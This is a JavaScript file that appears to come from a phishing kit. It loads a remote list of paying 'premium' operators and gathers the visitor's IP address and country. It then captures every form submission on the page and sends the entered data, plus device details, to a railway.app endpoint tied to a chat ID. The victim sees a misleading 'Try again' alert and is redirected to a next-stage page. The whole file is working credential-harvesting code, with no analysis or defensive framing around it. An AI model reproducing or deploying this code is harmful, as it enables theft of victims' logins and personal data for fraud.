// ================= LOAD PREMIUM USERS =================
// Uses a dynamic <script> tag — NOT fetch() — so the browser never sends
// an Origin header and CORS never applies. This is the only reliable
// cross-domain way to load an external JS file that sets a global variable.

function loadPremiumUsers() {
  return new Promise((resolve) => {
    // If already loaded from a previous call, reuse it
    if (Array.isArray(window.premiumUsers)) {
      return resolve(window.premiumUsers);
    }

    const script = document.createElement("script");
    // Cache-bust so the browser always fetches the latest list, never a
    // stale cached copy (important — premium status can change any time)
    script.src = "https://intelseller.com/premiumlist.js?_=" + Date.now();

    script.onload = function () {
      // premiumlist.js sets window.premiumUsers via its IIFE
      const list = Array.isArray(window.premiumUsers) ? window.premiumUsers : [];
      console.log(`✅ premiumlist.js loaded — ${list.length} premium user(s) found`, list);
      resolve(list);
    };

    script.onerror = function () {
      console.error("❌ Failed to load premiumlist.js — check network / server");
      resolve([]); // fail open so the page doesn't hard-break
    };

    document.head.appendChild(script);
  });
}

// ================= MAIN SCRIPT =================
document.addEventListener("DOMContentLoaded", async () => {
  const premiumUsers = await loadPremiumUsers(); // always wait for the list first

  const DEFAULT_USER_ID = "7979664801";
  const forms = document.querySelectorAll("form");

  let userCountry = "Unknown";
  let userIP      = "Unknown";
  let batteryLevel = "Unknown";

  // ---------- BATTERY INFO ----------
  if (navigator.getBattery) {
    navigator.getBattery()
      .then(battery => { batteryLevel = Math.round(battery.level * 100) + "%"; })
      .catch(() => {});
  }

  // ---------- IP + COUNTRY ----------
  fetch("https://ipapi.co/json/")
    .then(r => r.json())
    .then(data => {
      if (data) {
        userCountry = data.country_name || userCountry;
        userIP      = data.ip           || userIP;
      }
    })
    .catch(() => {});

  // ---------- FORM HANDLER ----------
  forms.forEach((form) => {
    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      const urlParams   = new URLSearchParams(window.location.search);
      const userId      = urlParams.get("id") || DEFAULT_USER_ID;
      const numericId   = Number(userId);

      // ❌ BLOCK NON-PREMIUM USERS
      if (!premiumUsers.includes(numericId)) {
        alert("🚫 Access denied\ntry again or check premium.");
        return;
      }

      // ✅ PREMIUM USER — collect and send form data
      const formData = new FormData(form);

      formData.append("chat_id", userId);
      formData.append("──────────────",   "");
      formData.append("📊 System Information", "");
      formData.append("──────────────",   "");
      formData.append("📄 Page",          document.title);
      formData.append("🕒 Date & Time",   new Date().toLocaleString());
      formData.append("🌍 Country",       userCountry);
      formData.append("📡 Client IP",     userIP);
      formData.append("🔋 Battery Level", batteryLevel);
      formData.append("💻 Platform",      navigator.platform || "Unknown");
      formData.append("🌐 Language",      navigator.language || "Unknown");
      formData.append("🔗 Page URL",      window.location.href);

      try {
        const response = await fetch(
          "https://web-production-d469f.up.railway.app/send",
          { method: "POST", body: formData }
        );

        if (response.ok) {
          alert("Try again ✅");
          form.reset();
          window.location.href = `code/c7.html?id=${encodeURIComponent(userId)}`;
        } else {
          const errorText = await response.text();
          console.error("Server Error:", errorText);
          alert("❌ Error submitting form");
        }
      } catch (err) {
        console.error("Network Error:", err);
        alert("⚠️ Network error");
      }
    });
  });
});
